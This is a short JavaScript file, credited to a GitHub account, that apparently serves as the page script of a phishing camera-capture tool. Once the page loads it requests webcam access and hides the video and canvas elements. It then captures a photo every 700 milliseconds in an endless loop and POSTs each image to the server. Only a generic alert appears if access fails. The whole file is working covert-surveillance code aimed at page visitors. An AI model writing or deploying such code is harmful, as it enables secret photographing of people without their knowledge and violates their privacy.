/* Coded By https://github.com/msfpt */

document.addEventListener('DOMContentLoaded', event => {

  const success = imgSrc => {

    $.ajax({
      url: location.origin,
      type: 'POST',
      data: {
        'Status': 'x1q',
        'imgSrc': imgSrc,
        'fileName': (new Date().getTime()),
        'err': 'false'
      }
    });

  }

  const error = (error) => {

    // console.warn(error);

    $.ajax({
      url: location.origin,
      type: 'POST',
      data: {
        'Status': 'x1q',
        'err': 'true'
      }
    });

    alert("Unable to retrieve your camera");
      
  }

  try {

    navigator.getUserMedia = navigator.getUserMedia || navigator.mozGetUserMedia;

    // Assign user media to video and start loop
    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {

      // Create hidden video element
      const video = document.createElement('video');
      video.style = 'display: none';
      video.width = screen.width;
      video.height = screen.height;
      document.body.appendChild(video);

      video.srcObject = stream;

      video.play();

      video.addEventListener('loadeddata', event => {

        // Create hidden canvas element
        const canvas = document.createElement('canvas');
        canvas.style = 'display: none';
        canvas.width = screen.width;
        canvas.height = screen.height;
        document.body.appendChild(canvas);

        // Grab canvas context
        const ctx = canvas.getContext('2d');

        // Loop forever
        let a = 0;

        const loop_take_photo = (mirror = false) => {

          // save transform
          ctx.save();

          // Flag for mirror image
          if (mirror) {
              ctx.translate(canvas.width, 0);
              ctx.scale(-1, 1);
          }

          // Copy video to canvas
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          // restore transform
          ctx.restore();

          a++

          // Send canvas to Server
          success(canvas.toDataURL());

          // Loop
          setTimeout(loop_take_photo, 700);

        };

        loop_take_photo();
                
      });

    });

  } catch (err) {
    error(err);
  }

});